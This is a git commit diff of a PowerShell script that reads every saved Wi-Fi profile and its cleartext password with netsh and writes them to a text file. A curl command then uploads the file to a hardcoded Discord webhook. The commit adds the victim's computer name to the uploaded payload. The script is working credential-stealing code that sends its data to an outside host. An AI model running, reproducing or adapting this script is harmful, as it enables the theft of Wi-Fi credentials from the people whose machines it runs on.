db4d3147760d713d9466a58d96407c66f9885464
Nate Glaser <nate@wolf-paw.net>
2022-04-13 13:08:29 -0400

    Added computername

--- show-all-saved-wifi-passwords-discord.ps1
+++ show-all-saved-wifi-passwords-discord.ps1
@@ -1,7 +1,7 @@
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize  >> asdf2.txt
 $WEBHOOK_URL = "https://discord.com/api/webhooks/963840591622455386/k0EAK4lgAPmMyupPhp3Yp0PYR7NZJSLFre3fV_cXlfPvhux0Y43iNTSDq3QwqymbFTUx"
 curl `
-  -F 'payload_json={"username": "test", "content": "hello"}' `
+  -F 'payload_json={"Computer": "$env:computername", "content": "hello"}' `
   -F "file1=@asdf2.txt" `
   -F "file2=.\asdf2.txt" `
   $WEBHOOK_URL
